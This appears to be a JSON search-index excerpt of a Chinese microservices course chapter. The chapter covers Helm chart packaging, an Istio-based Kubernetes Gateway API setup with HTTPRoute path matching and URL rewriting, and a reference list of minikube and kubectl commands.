rules: - matches: - path: type: PathPrefix value: /producer backendRefs: - name: producer-service port: 3001 filters: - type: URLRewrite urlRewrite: path: type: ReplacePrefixMatch replacePrefixMatch: \"\" - matches: - path: type: PathPrefix value: /consumer backendRefs: - name: consumer-service port: 3002 filters: - type: URLRewrite urlRewrite: path: type: ReplacePrefixMatch replacePrefixMatch: \"\" filters \u53ef\u4ee5\u7528\u4e8e\u4fee\u6539\u8bf7\u6c42\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u4e86 URLRewrite\uff0c\u7528\u4e8e\u91cd\u5199 URL\u3002path \u6a21\u5f0f\u53ef\u4ee5\u4f7f\u7528ReplacePrefixMatch\uff0c\u6765\u66ff\u6362\u524d\u7f00\u3002\u8fd9\u91cc\u6211\u4eec\u628a\u5339\u914d\u7684 prefix \u5220\u9664\uff0c\u5373\u5220\u9664 /producer \u548c /consumer \uff0c\u8fd9\u6837\uff0c\u6211\u4eec\u7684\u8bf7\u6c42\u5c31\u4f1a\u88ab\u8f6c\u53d1\u5230\u5bf9\u5e94\u7684\u670d\u52a1\u4e0a\uff0c\u800c\u8def\u5f84\u4e5f\u6b63\u5e38\u4e86\u3002 \u5f53\u7136\uff0cfilter \u4e0d\u6b62\u6709\u8fd9\u4e9b\u529f\u80fd\u3002\u5982\u679c\u8fd9\u4e9b\u529f\u80fd\u4e0d\u591f\u7528\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u81ea\u5b9a\u4e49 filter\u3002filter \u662f\u4e00\u4e2a Envoy \u7684\u914d\u7f6e\uff0c\u7528\u6237\u53ef\u4ee5\u901a\u8fc7 filter \u6765\u4fee\u6539\u8bf7\u6c42\u7684\u5185\u5bb9\u3002filter \u6709\u4e24\u79cd\u7c7b\u578b\uff0c\u4e00\u79cd\u662f HTTPFilter \uff0c\u4e00\u79cd\u662f NetworkFilter \u3002\u524d\u8005\u662f\u7528\u4e8e HTTP \u8bf7\u6c42\u7684\uff0c\u540e\u8005\u662f\u7528\u4e8e TCP \u8bf7\u6c42\u7684\u3002\u4e0d\u8fc7\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u4e0d\u8be6\u7ec6\u4ecb\u7ecd\u4e86\u3002 \u547d\u4ee4\u884c\u5de5\u5177 \u524d\u9762\u6211\u4eec\u53ea\u662f\u7b80\u5355\u5730\u4f7f\u7528\u4e86 k8s \u7684\u547d\u4ee4\u884c\u5de5\u5177 kubectl \u548c minikube\u3002\u73b0\u5728\u6211\u4eec\u7cfb\u7edf\u5730\u603b\u7ed3\u4e00\u4e0b k8s \u7684\u547d\u4ee4\u884c\u5de5\u5177\u3002 minikube minikube start \u542f\u52a8 minikube \u96c6\u7fa4\u3002 minikube stop \u505c\u6b62 minikube \u96c6\u7fa4\u3002 minikube delete \u5220\u9664 minikube \u96c6\u7fa4\u3002 minikube dashboard \u6253\u5f00 minikube \u7684 dashboard\u3002 minikube service <service-name> \u6253\u5f00\u670d\u52a1\u7684 UI\u3002 minikube ip \u83b7\u53d6 minikube \u7684 IP \u5730\u5740\u3002 minikube ssh SSH \u5230 minikube \u96c6\u7fa4\u3002 minikube tunnel \u521b\u5efa\u4e00\u4e2a\u96a7\u9053\uff0c\u7528\u4e8e\u8bbf\u95ee minikube \u96c6\u7fa4\u4e2d LoadBalancer \u7684\u670d\u52a1\u3002 kubectl kubectl get <resource> \u83b7\u5f97\u8d44\u6e90\u5217\u8868\u3002resource \u6211\u4eec\u76ee\u524d\u4ecb\u7ecd\u8fc7\u7684\u6709 Pod\uff0cService\uff0cReplicaSet\uff0cDeployment\uff0cGateway\uff0cHTTPRoute\u3002\u8fd9\u91cc resource \u53ef\u4ee5\u7b80\u5199\uff0c\u4f8b\u5982 pod \u53ef\u4ee5\u7b80\u5199\u4e3a po\uff0cservice \u53ef\u4ee5\u7b80\u5199\u4e3a svc\uff0cdeployment \u53ef\u4ee5\u7b80\u5199\u4e3a deploy\u3002\u6b64\u5916\uff0cresource \u8fd8\u6709 event\uff0cnode\uff0cnamespace\u3002 kubectl describe <resource> <resource-name> \u63cf\u8ff0\u8d44\u6e90\u3002\u53ef\u4ee5\u83b7\u5f97\u8d44\u6e90\u7684\u8be6\u7ec6\u4fe1\u606f\u3002 kubectl apply -f <file> \u5e94\u7528\u914d\u7f6e\u6587\u4ef6\u3002\u53ef\u4ee5\u5e94\u7528\u914d\u7f6e\u6587\u4ef6\uff0c\u4f8b\u5982 kubectl apply -f pod.yaml \u3002 kubectl exec -it <pod-name> -- /bin/bash \u8fdb\u5165 Pod \u7684 shell\u3002 kubectl logs <pod-name> \u67e5\u770b Pod \u7684\u65e5\u5fd7\u3002 kubectl port-forward <pod-name> <local-port>:<pod-port> \u5c06 Pod \u7684\u7aef\u53e3\u6620\u5c04\u5230\u672c\u5730\u7aef\u53e3\u3002\u6ce8\u610f\uff0c\u8fd9\u4e2a\u547d\u4ee4\u6620\u5c04\u7684\u662f Pod \u7684\u7aef\u53e3\uff0c\u800c\u4e0d\u662f Service \u7684\u7aef\u53e3\u3002 kubectl delete <resource> <resource-name> \u5220\u9664\u8d44\u6e90\u3002 kubectl edit <resource> <resource-name> \u7f16\u8f91\u8d44\u6e90\u3002 kubectl config <command> \u914d\u7f6e kubectl\u3002\u4f8b\u5982 kubectl config get-contexts \u53ef\u4ee5\u67e5\u770b\u6240\u6709\u7684 context\u3002 kubectl config use-context <context> \u53ef\u4ee5\u5207\u6362 context\u3002 kubectl config current-context \u53ef\u4ee5\u67e5\u770b\u5f53\u524d\u7684 context\u3002Context \u5373 k8s \u7684\u8fd0\u884c\u65f6\u3002 --all-namespaces \u9009\u9879\uff0c\u53ef\u4ee5\u67e5\u770b\u6240\u6709\u7684 namespace\u3002 --namespace <namespace> \u9009\u9879\uff0c\u53ef\u4ee5\u6307\u5b9a namespace\u3002 kubectl expose deployment <deployment-name> \u547d\u4ee4\uff0c\u53ef\u4ee5\u5c06 Deployment \u66b4\u9732\u4e3a Service\u3002\u4f8b\u5982 kubectl expose deployment producer --type=LoadBalancer --port=3001 --target-port=3001 \u3002\u8fd9\u6837\u672c\u8d28\u4e0a\u662f\u521b\u5efa\u4e86\u4e00\u4e2a Service\uff0c\u5c06 Service \u7684 3001 \u7aef\u53e3\u6620\u5c04\u5230 Deployment \u7684 3001 \u7aef\u53e3\u3002 kubectl scale deployment <deployment-name> --replicas=<replicas> \u547d\u4ee4\uff0c\u53ef\u4ee5\u6269\u5c55 Deployment \u7684\u526f\u672c\u6570\u91cf\u3002\u4f8b\u5982 kubectl scale deployment producer --replicas=3 \u3002\u5176\u5b9e\u5c31\u662f\u4fee\u6539\u4e86\u914d\u7f6e\u6587\u4ef6\u3002 kubectl annotate <resource> <resource-name> <key>=<value> \u547d\u4ee4\uff0c\u53ef\u4ee5\u7ed9\u8d44\u6e90\u6dfb\u52a0\u6ce8\u89e3\u3002\u4f8b\u5982 kubectl annotate pod producer app=producer \u3002 kubectl label <resource> <resource-name> <key>=<value> \u547d\u4ee4\uff0c\u53ef\u4ee5\u7ed9\u8d44\u6e90\u6dfb\u52a0\u6807\u7b7e\u3002\u4f8b\u5982 kubectl label pod producer app=producer \u3002 kubectl rollout <command> \u547d\u4ee4\uff0c\u53ef\u4ee5\u7ba1\u7406 Deployment \u7684\u6eda\u52a8\u66f4\u65b0\u3002\u4f8b\u5982 kubectl rollout status deployment producer \u53ef\u4ee5\u67e5\u770b Deployment \u7684\u66f4\u65b0\u72b6\u6001\u3002 kubectl rollout history deployment producer \u53ef\u4ee5\u67e5\u770b Deployment \u7684\u66f4\u65b0\u5386\u53f2\u3002 kubectl rollout undo deployment producer \u53ef\u4ee5\u56de\u6eda Deployment\u3002 kubectl rollout restart deployment producer \u53ef\u4ee5\u91cd\u542f Deployment\u3002 kubectl port-forward <pod-name> <local-port>:<pod-port> \u547d\u4ee4\uff0c\u53ef\u4ee5\u5c06 Pod \u7684\u7aef\u53e3\u6620\u5c04\u5230\u672c\u5730\u7aef\u53e3\u3002\u4f8b\u5982 kubectl port-forward producer-7d7b7d4b7b-7z7z7 3001:3001 \u3002","title":"helm \u6253\u5305 istio \u7f51\u5173\u4e0e k8s \u547d\u4ee4\u884c\u5de5\u5177"},{"location":"21/#ch21-helm-istio-k8s","text":"\u4e0a\u4e00\u7ae0\u4e2d\uff0c\u6211\u4eec\u8bb2\u89e3\u4e86\u5982\u4f55\u5728 k8s \u4e2d\u90e8\u7f72\u7b80\u5355\u7684\u65e0\u72b6\u6001\u670d\u52a1\u3002\u672c\u7ae0\u6bd4\u8f83\u7410\u788e\uff0c\u6709\u4e09\u4e2a\u90e8\u5206\uff0c\u5206\u522b\u662f\u5982\u4f55\u4f7f\u7528 helm \u6253\u5305 k8s \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5982\u4f55\u4f7f\u7528\u7f51\u5173\u5b9e\u73b0\u5fae\u670d\u52a1\u7684\u8bbf\u95ee\uff0ck8s \u7684\u547d\u4ee4\u884c\u5de5\u5177\u7684\u4f7f\u7528\u3002","title":"\u5fae\u670d\u52a1\u901f\u6210 Ch21 helm \u6253\u5305 istio \u7f51\u5173\u4e0e k8s \u547d\u4ee4\u884c\u5de5\u5177"},{"location":"21/#_1","text":"\u524d\u9762\u7684\u7ae0\u8282\u4e2d\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\uff0ck8s \u4f1a\u4ea7\u751f\u5927\u91cf\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u7528\u6237\u914d\u7f6e\u8d77\u6765\u4e5f\u5f88\u9ebb\u70e6\uff0c\u8981\u4e00\u4e2a\u4e2a\u627e\uff0c\u800c\u4e14\u8fd9\u4e9b\u914d\u7f6e\u6587\u4ef6\u4f1a\u6709\u5f88\u591a\u91cd\u590d\u7684\u5730\u65b9\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 helm \u8fd9\u4e2a\u5de5\u5177\u3002 helm \u5de5\u5177\u662f\u4e00\u4e2a k8s \u7684\u6253\u5305\u5de5\u5177\uff0c\u5b83\u53ef\u4ee5\u5c06 k8s \u7684\u914d\u7f6e\u6587\u4ef6\u6253\u5305\u6210\u4e00\u4e2a Chart\uff0c\u7136\u540e\u901a\u8fc7 helm \u8fd9\u4e2a\u5de5\u5177\u6765\u8fdb\u884c\u90e8\u7f72\u3002\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5c06\u6240\u6709\u7684\u914d\u7f6e\u6587\u4ef6\u6253\u5305\u6210\u4e00\u4e2a Chart\uff0c\u7136\u540e\u901a\u8fc7 helm \u8fd9\u4e2a\u5de5\u5177\u6765\u8fdb\u884c\u90e8\u7f72\u3002helm \u7684\u5b89\u88c5\u65b9\u6cd5\u89c1 \u5b98\u65b9\u6587\u6863 \u3002 \u9996\u5148\uff0c\u6211\u4eec\u628a\u4e0a\u4e00\u7ae0\u7684\u914d\u7f6e\u6587\u4ef6\u6253\u5305\u6210\u4e00\u4e2a Chart\u3002\u4f7f\u7528 helm create demo \u6765\u521b\u5efa\u4e00\u4e2a Chart\uff0c\u540d\u5b57\u53eb demo\u3002 Chart \u4e0b\u6709\u4e09\u4e2a\u6587\u4ef6\u5f88\u91cd\u8981\u3002 template \u6587\u4ef6\u5939\uff0c\u5176\u4e2d\u5b58\u653e\u4e86\u6240\u6709\u7684\u914d\u7f6e\u6587\u4ef6\u6a21\u7248\u3002\u8fd9\u91cc\u5b58\u653e\u7684\u5c31\u662f\u6211\u4eec\u4e4b\u524d\u7f16\u5199\u7684 k8s \u914d\u7f6e\u6587\u4ef6\u3002\u4e0d\u540c\u7684\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u8fd9\u91cc\u9762\u4f7f\u7528 go \u8bed\u8a00\u7684\u6a21\u7248\u5f15\u64ce\u8bed\u6cd5\uff0c\u4f8b\u5982`{{ .Values.image }}\uff0c\u5c31\u4f1a\u4ece\u8fd9\u4e2a\u6587\u4ef6\u83b7\u53d6\u53d8\u91cf image \u7684\u503c\u3002 values.yaml \u6587\u4ef6\uff0c\u5176\u4e2d\u5b58\u653e\u4e86\u6240\u6709\u7684\u914d\u7f6e\u6587\u4ef6\u7684\u503c\u3002\u8fd9\u91cc\u7684\u503c\u4f1a\u88ab\u7528\u4e8e\u6a21\u7248\u7684\u6e32\u67d3\u3002 Chart.yaml \u6587\u4ef6\uff0c\u5176\u4e2d\u5b58\u653e\u4e86 Chart \u7684\u5143\u6570\u636e\uff0c\u4f8b\u5982 Chart \u7684\u540d\u5b57\uff0c\u7248\u672c\u7b49\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u6211\u4eec\u7528\u6237\u53ef\u4ee5\u81ea\u5df1\u914d\u7f6e RabbitMQ \u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 values.yaml \u6587\u4ef6\u4e2d\u6dfb\u52a0\u8fd9\u4e24\u4e2a\u53d8\u91cf\u3002 rabbitmq: username: guest password: guest \u7136\u540e\uff0c\u5728 template \u6587\u4ef6\u5939\u4e2d\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e24\u4e2a\u53d8\u91cf\u3002 apiVersion: apps/v1 kind: Deployment metadata: name: mq spec: selector: matchLabels: app: mq template: metadata: labels: app: mq spec: containers: - name: mq image: rabbitmq:4.0-rc-management resources: limits: memory: \"128Mi\" cpu: \"500m\" env: - name: RABBITMQ_DEFAULT_USER value: {{ .Values.rabbitmq.username }} - name: RABBITMQ_DEFAULT_PASS value: {{ .Values.rabbitmq.password }} ports: - containerPort: 5672 - containerPort: 15672 \u8fd9\u6837\uff0c\u7528\u6237\u5c31\u6709\u4e86\u914d\u7f6e RabbitMQ \u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u80fd\u529b\u3002 Go \u7684\u6a21\u7248\u5f15\u64ce\u5341\u5206\u5f3a\u5927\uff0c\u53ef\u4ee5\u8fdb\u884c\u5faa\u73af\uff0c\u6761\u4ef6\u5224\u65ad\u7b49\u64cd\u4f5c\u3002\u66f4\u591a\u7684\u8bed\u6cd5\u53ef\u4ee5\u53c2\u8003 \u5b98\u65b9\u6587\u6863 \u3002 \u73b0\u5728\uff0c\u6211\u4eec\u5df2\u7ecf\u5199\u5b8c\u4e86 Chart\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 helm install demo ./demo \u6765\u5b89\u88c5\u8fd9\u4e2a Chart\u3002install \u540e\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f Chart \u7684\u540d\u79f0\uff0c\u540e\u7eed\u5bf9 Chart \u64cd\u4f5c\u90fd\u8981\u57fa\u4e8e\u8fd9\u4e2a\u540d\u79f0\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f Chart \u7684\u8def\u5f84\u3002 \u5982\u679c\u6211\u4eec\u505a\u4e86\u66f4\u6539\uff0c\u4e4b\u524d\u662f\u4f7f\u7528 kubectl apply -f . \u6765\u66f4\u65b0\u914d\u7f6e\u6587\u4ef6\uff0c\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 helm upgrade demo ./demo \u6765\u66f4\u65b0 Chart\u3002 Chart \u4e4b\u95f4\u53ef\u4ee5\u4e92\u76f8\u4f9d\u8d56\uff0c\u4f9d\u8d56\u5173\u7cfb\u53ef\u4ee5\u5728 Chart.yaml \u6587\u4ef6\u4e2d\u6307\u5b9a\u3002\u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5c06\u4e00\u4e9b\u516c\u5171\u7684\u914d\u7f6e\u6587\u4ef6\u6253\u5305\u6210 Chart\uff0c\u7136\u540e\u5728\u5176\u4ed6 Chart \u4e2d\u5f15\u7528\u3002\u4f8b\u5982\uff0c dependencies: - name: common version: 0.1.0 repository: file://../common \u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5728\u5f53\u524d Chart \u4e2d\u5f15\u7528 common Chart\u3002 \u5982\u679c\u8981\u4fee\u6539\u4f9d\u8d56\u7684\u914d\u7f6e\uff0c\u53ef\u4ee5\u5728 values.yaml \u4e2d\uff0c\u6dfb\u52a0\uff0c common: rabbitmq: username: admin password: admin common \u4ee3\u8868\u4e86\u524d\u9762 dependencies \u4e2d\u7684\u670d\u52a1\u540d\uff0c\u5728\u8fd9\u4e2a key \u4e0b\u7684\u6240\u6709\u53c2\u6570\u90fd\u4f1a\u88ab\u4f20\u9012\u5230 common Chart \u4e2d\u3002 \u8981\u52a0\u8f7d\u4f9d\u8d56\uff0c\u4f7f\u7528 helm dependency update \u547d\u4ee4\u3002\u4e4b\u540e\u7684\u5b89\u88c5\uff0c\u66f4\u65b0\u64cd\u4f5c\u548c\u4e4b\u524d\u4e00\u6837\u3002","title":"\u96c6\u7fa4\u6253\u5305"},{"location":"21/#_2","text":"\u5728\u5b66\u4e60 Spring Cloud \u65f6\uff0c\u6211\u4eec\u8bb2\u89e3\u4e86\u5982\u4f55\u4f7f\u7528 Spring Gateway \u6765\u5b9e\u73b0\u7f51\u5173\u3002\u5728 k8s \u4e2d\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528\u7f51\u5173\u6765\u5b9e\u73b0\u5fae\u670d\u52a1\u7684\u8bbf\u95ee\u3002 \u5728 k8s \u4e2d\uff0c\u901a\u5e38\u79f0\u96c6\u7fa4\u5185\u90e8\u7684\u6d41\u91cf\u4e3a\u4e1c\u897f\u6d41\u91cf\uff08East-West Traffic\uff09\uff0c\u96c6\u7fa4\u5916\u90e8\u7684\u6d41\u91cf\u4e3a\u5317\u5357\u6d41\u91cf\uff08North-South Traffic\uff09\u3002\u4e1c\u897f\u6d41\u91cf\u662f\u6307\u96c6\u7fa4\u5185\u90e8\u7684\u6d41\u91cf\uff0c\u4f8b\u5982\u4e00\u4e2a\u670d\u52a1\u8c03\u7528\u53e6\u4e00\u4e2a\u670d\u52a1\u3002\u5317\u5357\u6d41\u91cf\u662f\u6307\u96c6\u7fa4\u5916\u90e8\u7684\u6d41\u91cf\uff0c\u4f8b\u5982\u7528\u6237\u8bbf\u95ee\u670d\u52a1\u3002\u7f51\u5173\u5373\u662f\u670d\u52a1\u5357\u5317\u6d41\u91cf\u7684\u5165\u53e3\uff0c\u800c\u4e1c\u897f\u6d41\u91cf\u5219\u662f\u7531 k8s \u7684 Service \u6765\u5904\u7406\u7684\u3002 \u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u5efa\u7acb\u4e00\u4e2a Service\uff0c\u5e76\u4f7f\u7528 LoadBalancer \u7c7b\u578b\u3002\u7136\u540e\u5728\u8fd9\u4e2a Service \u4e0a\u66b4\u9732\u4e00\u4e2a Spring Gateway \u7684\u7aef\u53e3\u3002 \u622a\u81f3\u76ee\u524d\uff0ck8s \u7684\u7f51\u5173\u662f Gateway API\uff0c\u5c3d\u7ba1\u5df2\u7ecf\u751f\u4ea7\u53ef\u7528\uff0c\u4f46\u4ecd\u662f\u6bd4\u8f83\u65e9\u671f\u7684\u9636\u6bb5\u3002\u7136\u800c\uff0c\u6b64\u524d\u8d1f\u8d23\u7f51\u5173\u7684 Ingress \u7ec4\u4ef6\u5df2\u7ecf\u5df2\u7ecf\u505c\u6b62\u66f4\u65b0\uff0c\u529f\u80fd\u5c06\u4f1a\u88ab\u8fc1\u79fb\u5230 Gateway API \u4e2d\u3002Ingress \u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528\uff0c\u4f46\u5df2\u7ecf\u88ab\u6807\u8bb0\u4e3a\u8fc7\u65f6\u3002Ingress \u53ea\u652f\u6301 HTTP \u548c HTTPS \u534f\u8bae\uff0c\u800c Gateway API \u652f\u6301\u66f4\u591a\u7684\u534f\u8bae\uff0c\u4f8b\u5982 TCP\uff0cgRPC \u7b49\uff0c\u800c\u4e14\u66f4\u52a0\u7075\u6d3b\u5f3a\u5927\u3002 \u6ce8\u610f\uff0ck8s \u7684 Gateway API \u53ea\u89c4\u5b9a\u4e86 API\uff0c\u6ca1\u6709\u89c4\u5b9a\u5b9e\u73b0\u3002\u76ee\u524d\uff0c\u6709\u5f88\u591a\u5b9e\u73b0\u4e86 Gateway API \u7684\u7f51\u5173\uff0c\u4f8b\u5982 Istio\uff0cKong\uff0cTraefik \u7b49\u3002\u8fd9\u91cc\u6211\u4eec\u4ee5 Istio \u4e3a\u4f8b\u3002 Gateway \u76ee\u524d\u4e0d\u662f k8s \u7684\u539f\u751f\u8d44\u6e90\uff0c\u800c\u662f\u901a\u8fc7 CRD \u6765\u5b9e\u73b0\u7684\u3002CRD \u662f k8s \u7684\u4e00\u79cd\u6269\u5c55\u673a\u5236\uff0c\u53ef\u4ee5\u901a\u8fc7 CRD \u6765\u5b9a\u4e49\u65b0\u7684\u8d44\u6e90\u3002CRD \u5168\u79f0\u662f Custom Resource Definition\uff0c\u5373\u81ea\u5b9a\u4e49\u8d44\u6e90\u5b9a\u4e49\u3002 \u6839\u636e \u6587\u6863 \uff0c\u4f7f\u7528\u4e0b\u6587\u547d\u4ee4\u5b89\u88c5 Istio \u7684 CRD\u3002 kubectl get crd gateways.gateway.networking.k8s.io &> /dev/null || \\ { kubectl kustomize \"github.com/kubernetes-sigs/gateway-api/config/crd?ref=v1.1.0\" | kubectl apply -f -; } \u5728 helm \u4e2d\uff0c\u53ef\u4ee5\u5c06\u83b7\u53d6\u5230\u7684 CRD \u5b89\u88c5\u6587\u4ef6\u653e\u5728\u4e0e templates \u540c\u7ea7\u7684 crds \u6587\u4ef6\u5939\u4e2d\u3002CRD \u4f1a\u5728\u5b89\u88c5 Chart \u65f6\u81ea\u52a8\u5b89\u88c5\u3002 \u4f46\u662f\uff0c\u73b0\u5728\u53ea\u662f\u5b89\u88c5\u4e86 CRD\uff0c\u8fd8\u6ca1\u6709\u5b9e\u9645\u7684\u7f51\u5173\u5de5\u4f5c\u7684 Pod\u3002\u8981\u5b9e\u73b0\u7f51\u5173\uff0c\u8fd8\u9700\u8981\u5b89\u88c5 Istio \u7684\u7f51\u5173\u7ec4\u4ef6\u3002Istio \u7684\u7f51\u5173\u7ec4\u4ef6\u662f\u4e00\u4e2a Envoy \u7684\u5b9e\u4f8b\uff0cEnvoy \u662f\u4e00\u4e2a\u9ad8\u6027\u80fd\u7684\u4ee3\u7406\uff0c\u7528\u4e8e\u5904\u7406\u6240\u6709\u7684\u6d41\u91cf\u3002Istio \u7684\u7f51\u5173\u7ec4\u4ef6\u4f1a\u5c06\u6d41\u91cf\u8f6c\u53d1\u5230\u5bf9\u5e94\u7684\u670d\u52a1\u4e0a\u3002 \u5de5\u7a0b\u4e0a\uff0c\u6211\u4eec\u9996\u5148\u8981\u5b89\u88c5 istioctl \uff0c\u8fd9\u662f Istio \u7684\u547d\u4ee4\u884c\u5de5\u5177\u3002\u5b89\u88c5\u65b9\u6cd5\u53c2\u8003 \u6587\u6863 \u3002\u7136\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 istioctl install --set profile=minimal \u6765\u628a Istio \u5b89\u88c5\u5230\u96c6\u7fa4\u4e2d\u3002\u8fd9\u91cc\u7684 minimal \u662f\u6307\u6700\u5c0f\u7684\u914d\u7f6e\uff0c\u53ea\u5305\u542b\u4e86 Istio \u7684\u6838\u5fc3\u7ec4\u4ef6\u3002\u5b83\u4f1a\u5411\u6211\u4eec\u7684\u96c6\u7fa4\u6dfb\u52a0\u4e00\u4e2a Service\uff0c\u4e00\u4e2a Deployment\u3002","title":"\u7f51\u5173"},{"location":"21/#_3","text":"\u9996\u5148\u6211\u4eec\u6765\u5b9e\u73b0\u4e00\u4e2a\u5168\u8f6c\u53d1\u7f51\u5173\u3002\u5168\u8f6c\u53d1\u7f51\u5173\u662f\u6307\uff0c\u6240\u6709\u7684\u8bf7\u6c42\u90fd\u4f1a\u88ab\u8f6c\u53d1\u5230\u4e00\u4e2a\u670d\u52a1\u4e0a\u3002 \u6211\u4eec\u9996\u5148\u5148\u5efa\u7acb\u597d\u6211\u4eec\u4e4b\u524d\u6784\u5efa\u7684\u670d\u52a1\u96c6\u7fa4\uff0c\u7136\u540e\u6dfb\u52a0 Istio \u7684 CRD\u3002 Gateway API \u89c4\u5b9a\u4e86\u4e09\u7c7b\u7ec4\u4ef6\uff0cGateway Class\uff0c\u7f51\u5173\u7684\u63d0\u4f9b\u8005\uff1bGateway\uff0c\u7f51\u5173\u5b9e\u4f8b\uff1bRoute \u8def\u7531\u3002Gateway Class \u5728\u5b89\u88c5 Istio \u65f6\u5df2\u7ecf\u5b89\u88c5\u597d\u4e86\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5b9a\u4e49 Gateway \u548c Route\u3002 \u9996\u5148\u5b9a\u4e49 Gateway\uff0c apiVersion: gateway.networking.k8s.io/v1 kind: Gateway metadata: name: gateway spec: gatewayClassName: istio listeners: - name: default port: 80 protocol: HTTP allowedRoutes: namespaces: from: All listeners \u662f\u7f51\u5173\u8981\u76d1\u542c\u7684\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u662f\u76d1\u542c 80 \u7aef\u53e3\uff0c\u534f\u8bae\u662f HTTP\u3002allowedRoutes \u662f\u5141\u8bb8\u7684\u8def\u7531\uff0c\u8fd9\u91cc\u662f\u6240\u6709\u7684\u8def\u7531\u3002 \u7136\u540e\u5b9a\u4e49 Route\uff0c apiVersion: gateway.networking.k8s.io/v1 kind: HTTPRoute metadata: name: producer-router spec: parentRefs: - name: gateway rules: - backendRefs: - name: producer-service port: 3001 parentRefs \u662f\u6307\u5b9a\u8fd9\u4e2a Route \u5c5e\u4e8e\u54ea\u4e2a Gateway\u3002rules \u662f\u8def\u7531\u89c4\u5219\uff0c\u8fd9\u91cc\u662f\u6240\u6709\u7684\u8bf7\u6c42\u90fd\u8f6c\u53d1\u5230 producer-service \u7684 3001 \u7aef\u53e3\u3002 \u7ecf\u8fc7\u4e0a\u9762\u7684\u914d\u7f6e\uff0c\u6240\u6709\u5230\u8fbe\u7f51\u5173 80 \u7aef\u53e3\u7684\u8bf7\u6c42\u90fd\u4f1a\u88ab\u8f6c\u53d1\u5230 producer-service \u7684 3001 \u7aef\u53e3\u3002\u73b0\u5728\uff0c\u6211\u4eec\u53ef\u4ee5\u50cf\u8bbf\u95ee\u5176\u4ed6\u670d\u52a1\u4e00\u6837\u8bbf\u95ee\u7f51\u5173\u7684\u670d\u52a1\uff0c\u800c\u7f51\u5173\u4f1a\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230\u5bf9\u5e94\u7684\u670d\u52a1\u4e0a\u3002","title":"\u7b80\u5355\u5168\u8f6c\u53d1"},{"location":"21/#_4","text":"\u5168\u8f6c\u53d1\u7f51\u5173\u662f\u5c06\u6240\u6709\u7684\u8bf7\u6c42\u90fd\u8f6c\u53d1\u5230\u4e00\u4e2a\u670d\u52a1\u4e0a\uff0c\u800c\u8def\u5f84\u5339\u914d\u7f51\u5173\u662f\u6839\u636e\u8bf7\u6c42\u7684\u8def\u5f84\u6765\u8f6c\u53d1\u5230\u4e0d\u540c\u7684\u670d\u52a1\u4e0a\u3002 \u5047\u8bbe\u6211\u4eec\u5e0c\u671b\u901a\u8fc7\u7f51\u5173\u8def\u5f84 /producer \u7684\u8bf7\u6c42\u8f6c\u53d1\u5230 producer-service\uff0c\u8def\u5f84 /consumer \u7684\u8bf7\u6c42\u8f6c\u53d1\u5230 consumer-service\u3002\u53ea\u8981\u4fee\u6539 Route \u7684\u89c4\u5219\u5373\u53ef\u3002\u6211\u4eec\u9700\u8981\u9996\u5148\u5339\u914d\u8def\u5f84\u548c\u670d\u52a1\uff0c\u7136\u540e\u91cd\u5199\u8bf7\u6c42\u7684\u8def\u5f84\u3002 \u524d\u9762\u6211\u4eec\u7684 Rules \u6ca1\u6709\u5339\u914d\u89c4\u5219\uff0c\u6240\u4ee5\u8f6c\u53d1\u4e86\u6240\u6709\u7684\u8bf7\u6c42\u3002\u73b0\u5728\u6211\u4eec\u9700\u8981\u6dfb\u52a0\u5339\u914d\u89c4\u5219\u3002 apiVersion: gateway.networking.k8s.io/v1 kind: HTTPRoute metadata: name: router spec: parentRefs: - name: gateway rules: - matches: - path: type: PathPrefix value: /producer backendRefs: - name: producer-service port: 3001 - matches: - path: type: PathPrefix value: /consumer backendRefs: - name: consumer-service port: 3002 \u8fd9\u91cc\uff0c\u6211\u4eec\u6dfb\u52a0\u4e86\u4e24\u4e2a\u5339\u914d\u89c4\u5219\uff0c\u7b2c\u4e00\u4e2a\u89c4\u5219\u662f\u5339\u914d\u8def\u5f84\u524d\u7f00\u4e3a /producer \u7684\u8bf7\u6c42\uff0c\u8f6c\u53d1\u5230 producer-service \u7684 3001 \u7aef\u53e3\u3002\u7b2c\u4e8c\u4e2a\u89c4\u5219\u662f\u5339\u914d\u8def\u5f84\u524d\u7f00\u4e3a /consumer \u7684\u8bf7\u6c42\uff0c\u8f6c\u53d1\u5230 consumer-service \u7684 3002 \u7aef\u53e3\u3002matches \u91cc\u7684 path \u8868\u793a\u8def\u5f84\u5339\u914d\uff0c\u8def\u5f84\u5339\u914d\u6709\u4e09\u79cd\u7c7b\u578b\uff0c Exact \uff0c Prefix \uff0c Regex \uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u4e86 Prefix \u7c7b\u578b\u3002 \u6b64\u5916\uff0c\u8fd8\u53ef\u4ee5\u5339\u914d Host\uff0cHeader\uff0cMethod \u7b49\u3002 